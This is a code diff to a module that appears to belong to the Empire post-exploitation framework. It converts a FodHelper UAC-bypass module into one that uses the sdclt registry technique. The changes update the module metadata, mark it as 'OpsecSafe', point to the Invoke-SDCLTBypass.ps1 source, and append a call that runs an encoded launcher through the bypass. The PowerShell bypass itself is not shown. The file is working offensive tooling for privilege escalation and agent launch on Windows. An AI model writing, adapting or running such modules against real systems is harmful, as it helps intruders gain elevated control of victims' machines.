@@ -5,12 +5,12 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-FodHelperBypass',
+            'Name': 'Invoke-SDCLTBypass',
 
             'Author': ['Petr Medonos'],
 
-            'Description': ("Bypasses UAC by performing an registry modification for FodHelper (based on"
-                            "https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)"),
+            'Description': ("Bypasses UAC by performing an registry modification for sdclt (based on"
+                            "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)"),
         
             'Background' : True,
 
@@ -18,14 +18,14 @@ class Module:
             
             'NeedsAdmin' : False,
 
-            'OpsecSafe' : False,
+            'OpsecSafe' : True,
             
             'Language' : 'powershell',
 
             'MinLanguageVersion' : '2',
             
             'Comments': [
-                'https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/',
+                'https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/',
             ]
         }
 
@@ -81,7 +81,7 @@ class Module:
         proxyCreds = self.options['ProxyCreds']['Value']
 
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-FodHelperBypass.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-SDCLTBypass.ps1"
 
         try:
             f = open(moduleSource, 'r')
@@ -106,5 +106,5 @@ class Module:
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
             else:
-                script += "Invoke-FodHelperBypass -Command \"%s\"" % (encScript)
+                script += "Invoke-SDCLTBypass -Command \"%s\"" % (encScript)
                 return script
